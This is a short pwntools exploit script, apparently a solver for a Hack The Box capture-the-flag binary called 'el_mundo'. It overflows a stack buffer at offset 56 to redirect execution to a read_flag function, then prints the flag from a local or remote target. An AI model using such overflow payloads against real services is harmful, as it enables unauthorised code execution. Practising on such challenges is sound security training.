#!/usr/bin/python3
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.log_level = 'critical'

fname = './el_mundo' 

LOCAL = True # Change this to "True" to run it locally 

os.system('clear')

if LOCAL:
  print('Running solver locally..\n')
  r    = process(fname)
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP} {PORT}\n')

e = ELF(fname)
e.address = 0x400000

payload = flat({
    56: p64(e.symbols['read_flag'])
    }, filler=b'\x90')

# Send payload
r.sendlineafter('> ', payload)

# Read flag
print(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}\n')

